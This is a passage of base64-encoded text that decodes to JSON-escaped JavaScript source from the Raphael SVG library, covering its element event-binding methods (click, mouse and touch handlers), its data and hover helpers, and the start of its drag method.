GZ1bmN0aW9uIChlKSB7XG4gICAgICAgIFIudW5tb3VzZW1vdmUoZHJhZ01vdmUpLnVubW91c2V1cChkcmFnVXApO1xuICAgICAgICB2YXIgaSA9IGRyYWcubGVuZ3RoLFxuICAgICAgICAgICAgZHJhZ2k7XG4gICAgICAgIHdoaWxlIChpLS0pIHtcbiAgICAgICAgICAgIGRyYWdpID0gZHJhZ1tpXTtcbiAgICAgICAgICAgIGRyYWdpLmVsLl9kcmFnID0ge307XG4gICAgICAgICAgICBldmUoXCJyYXBoYWVsLmRyYWcuZW5kLlwiICsgZHJhZ2kuZWwuaWQsIGRyYWdpLmVuZF9zY29wZSB8fCBkcmFnaS5zdGFydF9zY29wZSB8fCBkcmFnaS5tb3ZlX3Njb3BlIHx8IGRyYWdpLmVsLCBlKTtcbiAgICAgICAgfVxuICAgICAgICBkcmFnID0gW107XG4gICAgfSxcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5lbFxuICAgICBbIHByb3BlcnR5IChvYmplY3QpIF1cbiAgICAgKipcbiAgICAgKiBZb3UgY2FuIGFkZCB5b3VyIG93biBtZXRob2QgdG8gZWxlbWVudHMuIFRoaXMgaXMgdXNlZnVsIHdoZW4geW91IHdhbnQgdG8gaGFjayBkZWZhdWx0IGZ1bmN0aW9uYWxpdHkgb3JcbiAgICAgKiB3YW50IHRvIHdyYXAgc29tZSBjb21tb24gdHJhbnNmb3JtYXRpb24gb3IgYXR0cmlidXRlcyBpbiBvbmUgbWV0aG9kLiBJbiBkaWZmZXJlbmNlIHRvIGNhbnZhcyBtZXRob2RzLFxuICAgICAqIHlvdSBjYW4gcmVkZWZpbmUgZWxlbWVudCBtZXRob2QgYXQgYW55IHRpbWUuIEV4cGVuZGluZyBlbGVtZW50IG1ldGhvZHMgd291bGRu4oCZdCBhZmZlY3Qgc2V0LlxuICAgICA+IFVzYWdlXG4gICAgIHwgUmFwaGFlbC5lbC5yZWQgPSBmdW5jdGlvbiAoKSB7XG4gICAgIHwgICAgIHRoaXMuYXR0cih7ZmlsbDogXCIjZjAwXCJ9KTtcbiAgICAgfCB9O1xuICAgICB8IC8vIHRoZW4gdXNlIGl0XG4gICAgIHwgcGFwZXIuY2lyY2xlKDEwMCwgMTAwLCAyMCkucmVkKCk7XG4gICAgXFwqL1xuICAgIGVscHJvdG8gPSBSLmVsID0ge307XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuY2xpY2tcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEFkZHMgZXZlbnQgaGFuZGxlciBmb3IgY2xpY2sgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudW5jbGlja1xuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBldmVudCBoYW5kbGVyIGZvciBjbGljayBmb3IgdGhlIGVsZW1lbnQuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGhhbmRsZXIgKGZ1bmN0aW9uKSAjb3B0aW9uYWwgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG5cbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5kYmxjbGlja1xuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQWRkcyBldmVudCBoYW5kbGVyIGZvciBkb3VibGUgY2xpY2sgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudW5kYmxjbGlja1xuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBldmVudCBoYW5kbGVyIGZvciBkb3VibGUgY2xpY2sgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgI29wdGlvbmFsIGhhbmRsZXIgZm9yIHRoZSBldmVudFxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQubW91c2Vkb3duXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBBZGRzIGV2ZW50IGhhbmRsZXIgZm9yIG1vdXNlZG93biBmb3IgdGhlIGVsZW1lbnQuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGhhbmRsZXIgKGZ1bmN0aW9uKSBoYW5kbGVyIGZvciB0aGUgZXZlbnRcbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cbiAgICAvKlxcXG4gICAgICogRWxlbWVudC51bm1vdXNlZG93blxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBldmVudCBoYW5kbGVyIGZvciBtb3VzZWRvd24gZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgI29wdGlvbmFsIGhhbmRsZXIgZm9yIHRoZSBldmVudFxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQubW91c2Vtb3ZlXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBBZGRzIGV2ZW50IGhhbmRsZXIgZm9yIG1vdXNlbW92ZSBmb3IgdGhlIGVsZW1lbnQuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGhhbmRsZXIgKGZ1bmN0aW9uKSBoYW5kbGVyIGZvciB0aGUgZXZlbnRcbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cbiAgICAvKlxcXG4gICAgICogRWxlbWVudC51bm1vdXNlbW92ZVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBldmVudCBoYW5kbGVyIGZvciBtb3VzZW1vdmUgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgI29wdGlvbmFsIGhhbmRsZXIgZm9yIHRoZSBldmVudFxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQubW91c2VvdXRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEFkZHMgZXZlbnQgaGFuZGxlciBmb3IgbW91c2VvdXQgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudW5tb3VzZW91dFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBldmVudCBoYW5kbGVyIGZvciBtb3VzZW91dCBmb3IgdGhlIGVsZW1lbnQuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGhhbmRsZXIgKGZ1bmN0aW9uKSAjb3B0aW9uYWwgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG5cbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5tb3VzZW92ZXJcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEFkZHMgZXZlbnQgaGFuZGxlciBmb3IgbW91c2VvdmVyIGZvciB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gaGFuZGxlciAoZnVuY3Rpb24pIGhhbmRsZXIgZm9yIHRoZSBldmVudFxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnVubW91c2VvdmVyXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZW1vdmVzIGV2ZW50IGhhbmRsZXIgZm9yIG1vdXNlb3ZlciBmb3IgdGhlIGVsZW1lbnQuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGhhbmRsZXIgKGZ1bmN0aW9uKSAjb3B0aW9uYWwgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG5cbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5tb3VzZXVwXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBBZGRzIGV2ZW50IGhhbmRsZXIgZm9yIG1vdXNldXAgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudW5tb3VzZXVwXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZW1vdmVzIGV2ZW50IGhhbmRsZXIgZm9yIG1vdXNldXAgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgI29wdGlvbmFsIGhhbmRsZXIgZm9yIHRoZSBldmVudFxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudG91Y2hzdGFydFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQWRkcyBldmVudCBoYW5kbGVyIGZvciB0b3VjaHN0YXJ0IGZvciB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gaGFuZGxlciAoZnVuY3Rpb24pIGhhbmRsZXIgZm9yIHRoZSBldmVudFxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnVudG91Y2hzdGFydFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBldmVudCBoYW5kbGVyIGZvciB0b3VjaHN0YXJ0IGZvciB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gaGFuZGxlciAoZnVuY3Rpb24pICNvcHRpb25hbCBoYW5kbGVyIGZvciB0aGUgZXZlbnRcbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cblxuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnRvdWNobW92ZVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQWRkcyBldmVudCBoYW5kbGVyIGZvciB0b3VjaG1vdmUgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudW50b3VjaG1vdmVcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJlbW92ZXMgZXZlbnQgaGFuZGxlciBmb3IgdG91Y2htb3ZlIGZvciB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gaGFuZGxlciAoZnVuY3Rpb24pICNvcHRpb25hbCBoYW5kbGVyIGZvciB0aGUgZXZlbnRcbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cblxuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnRvdWNoZW5kXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBBZGRzIGV2ZW50IGhhbmRsZXIgZm9yIHRvdWNoZW5kIGZvciB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gaGFuZGxlciAoZnVuY3Rpb24pIGhhbmRsZXIgZm9yIHRoZSBldmVudFxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnVudG91Y2hlbmRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJlbW92ZXMgZXZlbnQgaGFuZGxlciBmb3IgdG91Y2hlbmQgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgI29wdGlvbmFsIGhhbmRsZXIgZm9yIHRoZSBldmVudFxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudG91Y2hjYW5jZWxcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEFkZHMgZXZlbnQgaGFuZGxlciBmb3IgdG91Y2hjYW5jZWwgZm9yIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoYW5kbGVyIChmdW5jdGlvbikgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudW50b3VjaGNhbmNlbFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBldmVudCBoYW5kbGVyIGZvciB0b3VjaGNhbmNlbCBmb3IgdGhlIGVsZW1lbnQuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGhhbmRsZXIgKGZ1bmN0aW9uKSAjb3B0aW9uYWwgaGFuZGxlciBmb3IgdGhlIGV2ZW50XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG4gICAgZm9yICh2YXIgaSA9IGV2ZW50cy5sZW5ndGg7IGktLTspIHtcbiAgICAgICAgKGZ1bmN0aW9uIChldmVudE5hbWUpIHtcbiAgICAgICAgICAgIFJbZXZlbnROYW1lXSA9IGVscHJvdG9bZXZlbnROYW1lXSA9IGZ1bmN0aW9uIChmbiwgc2NvcGUpIHtcbiAgICAgICAgICAgICAgICBpZiAoUi5pcyhmbiwgXCJmdW5jdGlvblwiKSkge1xuICAgICAgICAgICAgICAgICAgICB0aGlzLmV2ZW50cyA9IHRoaXMuZXZlbnRzIHx8IFtdO1xuICAgICAgICAgICAgICAgICAgICB0aGlzLmV2ZW50cy5wdXNoKHtuYW1lOiBldmVudE5hbWUsIGY6IGZuLCB1bmJpbmQ6IGFkZEV2ZW50KHRoaXMuc2hhcGUgfHwgdGhpcy5ub2RlIHx8IGcuZG9jLCBldmVudE5hbWUsIGZuLCBzY29wZSB8fCB0aGlzKX0pO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcztcbiAgICAgICAgICAgIH07XG4gICAgICAgICAgICBSW1widW5cIiArIGV2ZW50TmFtZV0gPSBlbHByb3RvW1widW5cIiArIGV2ZW50TmFtZV0gPSBmdW5jdGlvbiAoZm4pIHtcbiAgICAgICAgICAgICAgICB2YXIgZXZlbnRzID0gdGhpcy5ldmVudHMgfHwgW10sXG4gICAgICAgICAgICAgICAgICAgIGwgPSBldmVudHMubGVuZ3RoO1xuICAgICAgICAgICAgICAgIHdoaWxlIChsLS0pe1xuICAgICAgICAgICAgICAgICAgICBpZiAoZXZlbnRzW2xdLm5hbWUgPT0gZXZlbnROYW1lICYmIChSLmlzKGZuLCBcInVuZGVmaW5lZFwiKSB8fCBldmVudHNbbF0uZiA9PSBmbikpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50c1tsXS51bmJpbmQoKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50cy5zcGxpY2UobCwgMSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAhZXZlbnRzLmxlbmd0aCAmJiBkZWxldGUgdGhpcy5ldmVudHM7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgICAgICB9O1xuICAgICAgICB9KShldmVudHNbaV0pO1xuICAgIH1cblxuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LmRhdGFcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEFkZHMgb3IgcmV0cmlldmVzIGdpdmVuIHZhbHVlIGFzc29jaWF0ZWQgd2l0aCBnaXZlbiBrZXkuXG4gICAgICoqXG4gICAgICogU2VlIGFsc28gQEVsZW1lbnQucmVtb3ZlRGF0YVxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBrZXkgKHN0cmluZykga2V5IHRvIHN0b3JlIGRhdGFcbiAgICAgLSB2YWx1ZSAoYW55KSAjb3B0aW9uYWwgdmFsdWUgdG8gc3RvcmVcbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgICAqIG9yLCBpZiB2YWx1ZSBpcyBub3Qgc3BlY2lmaWVkOlxuICAgICA9IChhbnkpIHZhbHVlXG4gICAgICogb3IsIGlmIGtleSBhbmQgdmFsdWUgYXJlIG5vdCBzcGVjaWZpZWQ6XG4gICAgID0gKG9iamVjdCkgS2V5L3ZhbHVlIHBhaXJzIGZvciBhbGwgdGhlIGRhdGEgYXNzb2NpYXRlZCB3aXRoIHRoZSBlbGVtZW50LlxuICAgICA+IFVzYWdlXG4gICAgIHwgZm9yICh2YXIgaSA9IDAsIGkgPCA1LCBpKyspIHtcbiAgICAgfCAgICAgcGFwZXIuY2lyY2xlKDEwICsgMTUgKiBpLCAxMCwgMTApXG4gICAgIHwgICAgICAgICAgLmF0dHIoe2ZpbGw6IFwiIzAwMFwifSlcbiAgICAgfCAgICAgICAgICAuZGF0YShcImlcIiwgaSlcbiAgICAgfCAgICAgICAgICAuY2xpY2soZnVuY3Rpb24gKCkge1xuICAgICB8ICAgICAgICAgICAgIGFsZXJ0KHRoaXMuZGF0YShcImlcIikpO1xuICAgICB8ICAgICAgICAgIH0pO1xuICAgICB8IH1cbiAgICBcXCovXG4gICAgZWxwcm90by5kYXRhID0gZnVuY3Rpb24gKGtleSwgdmFsdWUpIHtcbiAgICAgICAgdmFyIGRhdGEgPSBlbGRhdGFbdGhpcy5pZF0gPSBlbGRhdGFbdGhpcy5pZF0gfHwge307XG4gICAgICAgIGlmIChhcmd1bWVudHMubGVuZ3RoID09IDApIHtcbiAgICAgICAgICAgIHJldHVybiBkYXRhO1xuICAgICAgICB9XG4gICAgICAgIGlmIChhcmd1bWVudHMubGVuZ3RoID09IDEpIHtcbiAgICAgICAgICAgIGlmIChSLmlzKGtleSwgXCJvYmplY3RcIikpIHtcbiAgICAgICAgICAgICAgICBmb3IgKHZhciBpIGluIGtleSkgaWYgKGtleVtoYXNdKGkpKSB7XG4gICAgICAgICAgICAgICAgICAgIHRoaXMuZGF0YShpLCBrZXlbaV0pO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcztcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGV2ZShcInJhcGhhZWwuZGF0YS5nZXQuXCIgKyB0aGlzLmlkLCB0aGlzLCBkYXRhW2tleV0sIGtleSk7XG4gICAgICAgICAgICByZXR1cm4gZGF0YVtrZXldO1xuICAgICAgICB9XG4gICAgICAgIGRhdGFba2V5XSA9IHZhbHVlO1xuICAgICAgICBldmUoXCJyYXBoYWVsLmRhdGEuc2V0LlwiICsgdGhpcy5pZCwgdGhpcywgdmFsdWUsIGtleSk7XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQucmVtb3ZlRGF0YVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyB2YWx1ZSBhc3NvY2lhdGVkIHdpdGggYW4gZWxlbWVudCBieSBnaXZlbiBrZXkuXG4gICAgICogSWYga2V5IGlzIG5vdCBwcm92aWRlZCwgcmVtb3ZlcyBhbGwgdGhlIGRhdGEgb2YgdGhlIGVsZW1lbnQuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGtleSAoc3RyaW5nKSAjb3B0aW9uYWwga2V5XG4gICAgID0gKG9iamVjdCkgQEVsZW1lbnRcbiAgICBcXCovXG4gICAgZWxwcm90by5yZW1vdmVEYXRhID0gZnVuY3Rpb24gKGtleSkge1xuICAgICAgICBpZiAoa2V5ID09IG51bGwpIHtcbiAgICAgICAgICAgIGRlbGV0ZSBlbGRhdGFbdGhpcy5pZF07XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBlbGRhdGFbdGhpcy5pZF0gJiYgZGVsZXRlIGVsZGF0YVt0aGlzLmlkXVtrZXldO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LmdldERhdGFcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJldHJpZXZlcyB0aGUgZWxlbWVudCBkYXRhXG4gICAgID0gKG9iamVjdCkgZGF0YVxuICAgIFxcKi9cbiAgICBlbHByb3RvLmdldERhdGEgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHJldHVybiBjbG9uZShlbGRhdGFbdGhpcy5pZF0gfHwge30pO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuaG92ZXJcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEFkZHMgZXZlbnQgaGFuZGxlcnMgZm9yIGhvdmVyIGZvciB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gZl9pbiAoZnVuY3Rpb24pIGhhbmRsZXIgZm9yIGhvdmVyIGluXG4gICAgIC0gZl9vdXQgKGZ1bmN0aW9uKSBoYW5kbGVyIGZvciBob3ZlciBvdXRcbiAgICAgLSBpY29udGV4dCAob2JqZWN0KSAjb3B0aW9uYWwgY29udGV4dCBmb3IgaG92ZXIgaW4gaGFuZGxlclxuICAgICAtIG9jb250ZXh0IChvYmplY3QpICNvcHRpb25hbCBjb250ZXh0IGZvciBob3ZlciBvdXQgaGFuZGxlclxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuICAgIGVscHJvdG8uaG92ZXIgPSBmdW5jdGlvbiAoZl9pbiwgZl9vdXQsIHNjb3BlX2luLCBzY29wZV9vdXQpIHtcbiAgICAgICAgcmV0dXJuIHRoaXMubW91c2VvdmVyKGZfaW4sIHNjb3BlX2luKS5tb3VzZW91dChmX291dCwgc2NvcGVfb3V0IHx8IHNjb3BlX2luKTtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnVuaG92ZXJcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJlbW92ZXMgZXZlbnQgaGFuZGxlcnMgZm9yIGhvdmVyIGZvciB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gZl9pbiAoZnVuY3Rpb24pIGhhbmRsZXIgZm9yIGhvdmVyIGluXG4gICAgIC0gZl9vdXQgKGZ1bmN0aW9uKSBoYW5kbGVyIGZvciBob3ZlciBvdXRcbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLnVuaG92ZXIgPSBmdW5jdGlvbiAoZl9pbiwgZl9vdXQpIHtcbiAgICAgICAgcmV0dXJuIHRoaXMudW5tb3VzZW92ZXIoZl9pbikudW5tb3VzZW91dChmX291dCk7XG4gICAgfTtcbiAgICB2YXIgZHJhZ2dhYmxlID0gW107XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuZHJhZ1xuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQWRkcyBldmVudCBoYW5kbGVycyBmb3IgZHJhZyBvZiB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gb25tb3ZlIChmdW5jdGlvbikgaGFuZGxlciBmb3IgbW92aW5nXG4gICAgIC0gb25zdGFydCAoZnVuY3Rpb24pIGhhbmRsZXIgZm9yIGRyYWcgc3RhcnRcbiAgICAgLSBvbmVuZCAoZnVuY3Rpb24pIGhhbmRsZXIgZm9yIGRyYWcgZW5kXG4gICAgIC0gbWNvbnRleHQgKG9iamVjdCkgI29wdGlvbmFsIGNvbnRleHQgZm9yIG1vdmluZyBoYW5kbGVyXG4gICAgIC0gc2NvbnRleHQgKG9iamVjdCkgI29wdGlvbmFsIGNvbnRleHQgZm9yIGRyYWcgc3RhcnQgaGFuZGxlclxuICAgICAtIGVjb250ZXh0IChvYmplY3QpICNvcHRpb25hbCBjb250ZXh0IGZvciBkcmFnIGVuZCBoYW5kbGVyXG4gICAgICogQWRkaXRpb25hbGx5IGZvbGxvd2luZyBgZHJhZ2AgZXZlbnRzIHdpbGwgYmUgdHJpZ2dlcmVkOiBgZHJhZy5zdGFydC48aWQ+YCBvbiBzdGFydCxcbiAgICAgKiBgZHJhZy5lbmQuPGlkPmAgb24gZW5kIGFuZCBgZHJhZy5tb3ZlLjxpZD5gIG9uIGV2ZXJ5IG1vdmUuIFdoZW4gZWxlbWVudCB3aWxsIGJlIGRyYWdnZWQgb3ZlciBhbm90aGVyIGVsZW1lbnRcbiAgICAgKiBgZHJhZy5vdmVyLjxpZD5gIHdpbGwgYmUgZmlyZWQgYXMgd2VsbC5cbiAgICAgKlxuICAgICAqIFN0YXJ0IGV2ZW50IGFuZCBzdGFydCBoYW5kbGVyIHdpbGwgYmUgY2FsbGVkIGluIHNwZWNpZmllZCBjb250ZXh0IG9yIGluIGNvbnRleHQgb2YgdGhlIGVsZW1lbnQgd2l0aCBmb2xsb3dpbmcgcGFyYW1ldGVyczpcbiAgICAgbyB4IChudW1iZXIpIHggcG9zaXRpb24gb2YgdGhlIG1vdXNlXG4gICAgIG8geSAobnVtYmVyKSB5IHBvc2l0aW9uIG9mIHRoZSBtb3VzZVxuICAgICBvIGV2ZW50IChvYmplY3QpIERPTSBldmVudCBvYmplY3RcbiAgICAgKiBNb3ZlIGV2ZW50IGFuZCBtb3ZlIGhhbmRsZXIgd2lsbCBiZSBjYWxsZWQgaW4gc3BlY2lmaWVkIGNvbnRleHQgb3IgaW4gY29udGV4dCBvZiB0aGUgZWxlbWVudCB3aXRoIGZvbGxvd2luZyBwYXJhbWV0ZXJzOlxuICAgICBvIGR4IChudW1iZXIpIHNoaWZ0IGJ5IHggZnJvbSB0aGUgc3RhcnQgcG9pbnRcbiAgICAgbyBkeSAobnVtYmVyKSBzaGlmdCBieSB5IGZyb20gdGhlIHN0YXJ0IHBvaW50XG4gICAgIG8geCAobnVtYmVyKSB4IHBvc2l0aW9uIG9mIHRoZSBtb3VzZVxuICAgICBvIHkgKG51bWJlcikgeSBwb3NpdGlvbiBvZiB0aGUgbW91c2VcbiAgICAgbyBldmVudCAob2JqZWN0KSBET00gZXZlbnQgb2JqZWN0XG4gICAgICogRW5kIGV2ZW50IGFuZCBlbmQgaGFuZGxlciB3aWxsIGJlIGNhbGxlZCBpbiBzcGVjaWZpZWQgY29udGV4dCBvciBpbiBjb250ZXh0IG9mIHRoZSBlbGVtZW50IHdpdGggZm9sbG93aW5nIHBhcmFtZXRlcnM6XG4gICAgIG8gZXZlbnQgKG9iamVjdCkgRE9NIGV2ZW50IG9iamVjdFxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuICAgIGVscHJvdG8uZHJhZyA9IGZ1bmN0aW9uIChvbm1vdmUsIG9uc3RhcnQsIG9uZW5kLCBtb3ZlX3Njb3BlLCBzdGFydF9zY29wZSwgZW5kX3Njb3BlKSB7XG4gICAgICAgIGZ1bmN0aW9uIHN0YXJ0KGUpIHtcbiAgICAgICAgICAgIChlLm9yaWdpbmFsRXZlbnQgfHwgZSkucHJldmVudERlZmF1bHQoKTtcbiAgICAgICAgICAgIHZhciB4ID0gZS5jbGllbnRYLFxuICAgICAgICAgICAgICAgIHkgPSBlLmNsaWVudFksXG4gICAgICAgICAgICAgICAgc2Nyb2xsWSA9IGcuZG9jLmRvY3VtZW50RWxlbWVudC5zY3JvbGxUb3AgfHwgZy5kb2MuYm9keS5zY3JvbGxUb3AsXG4gICAgICAgICAgICAgICAgc2Nyb2xsWCA9IGcuZG9jLmRvY3VtZW50RWxlbWVudC5zY3JvbGxMZWZ0IHx8IGcuZG9jLmJvZHkuc2Nyb2xsTGVmdDtcbiAgICAgICAgICAgIHRoaXMuX2RyYWcuaWQgPSBlLmlkZW50aWZpZXI7XG